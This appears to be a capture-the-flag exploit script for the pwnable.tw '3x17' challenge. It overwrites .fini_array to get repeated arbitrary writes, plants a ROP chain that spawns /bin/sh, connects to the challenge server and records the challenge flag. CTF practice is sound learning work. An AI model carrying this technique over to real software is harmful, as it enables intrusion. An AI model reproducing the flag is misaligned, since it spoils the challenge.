import sys

from pwn import *
from rich.progress import track

_dl_fini = 0x00402960
fini_array = 0x004B40F0
main = 0x00401B6D


def send(addr: int, data: bytes):
    p.sendlineafter(b"addr:", str(addr).encode())
    p.sendafter(b"data:", data)


RW_ADDR = 0x4B7000
rop_chain = flat(
    [
        p64(0x47E5D6),  # pop rax; pop rdx; pop rbx; ret
        p64(u64(b"/bin/sh\x00")),  # rax
        p64(RW_ADDR),  # rdx
        p64(0x000000),  # rbx
        p64(0x4184D0),  # mov qword ptr [rdx], rax; ret ; writes /bin/sh at 0x4B7000
        p64(0x41E4AF),  # pop rax; ret
        p64(0x00003B),  # NR = 0x3b ; SYS_execve
        p64(0x401696),  # pop rdi; ret
        p64(RW_ADDR),  # rdi ; will point to /bin/sh
        p64(0x44A309),  # pop rdx; pop rsi; ret
        p64(0x000000),  # rdx ; envp = NULL
        p64(0x000000),  # rsi ; argv = NULL
        p64(0x471DB5),  # syscall
    ]
)


# overwrite fini_array with two entries:
# 1. call_fini_array (to create a loop)
# 2. main
# this will cause a loop calling: main -> _dl_fini -> main -> _dl_fini -> main -> ...
# which will enable us to do artbitrary writes as much as we need.
def overwrite_dtors(dtors: list[int]):
    if len(dtors) != 2:
        raise RuntimeError("need two dtors")

    send(fini_array, p64(dtors[0]) + p64(dtors[1]))


DEBUG = len(sys.argv) > 1
if DEBUG:
    p = process("./3x17")
    commands = """
    b *0x0040298c
    #b *0x489C24
    #b *0x00401c4c
    """
    time.sleep(3)
else:
    with context.quiet:
        p = remote("chall.pwnable.tw", 10105)
info("Connecting to remote...")
overwrite_dtors([_dl_fini, main])

# upload ROP chain in chunks.
# each chunk is written after the two destructors that the program actually calls.

CHUNK_SIZE = 0x18


def upload_in_chunks(addr: int, data: bytes):
    for i in track(
        range(0, len(data), CHUNK_SIZE),
        description=f"Writing data at {addr:#x}...",
        transient=True,
    ):
        send(addr + i, data[i : i + CHUNK_SIZE])


# upload shellcode...
upload_in_chunks(fini_array + 0x10, rop_chain)

leave_ret = 0x489C24
ret = 0x402BCF
# trigger ret ; leave ; ret
# TODO: understand why this triggers the ROP chain!!!???


if DEBUG:
    gdb.attach(p, commands)

# before this function, the .fini array is filled with: [_dl_fini, main].
# overwrite_dtors() uses main to overwrite .fini_array AGAIN with [leave_ret, ret].
# when main finishes (it was called from _dl_fini when it executed .fini_array[1]),
# _dl_fini goes to execute .fini_array[0], which is the LEAVE; RET gadget.
# the LEAVE instruction does:
# mov rsp, rbp + 8; => RSP = .fini_array
# pop rbp => RSP = .fini_array+8
# and then the RET instruction:
# pops RIP from the stack (RIP = .fini_array[1]). RSP currently points to .fini_array+16.
# ret => RIP = .fini_array+8=.fini_array[1] which is a RET gadget.
# the second RET gadget pops RIP from the stack. but RSP=.fini_array+16, which is the begining of the ROP.
# so execution is being redirected to the first gadget of the ROP itself.
overwrite_dtors([leave_ret, ret])

# Get the flag:
# ---------------
# cat /home/3x17/the_4ns_is_51_fl4g
# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
p.interactive()
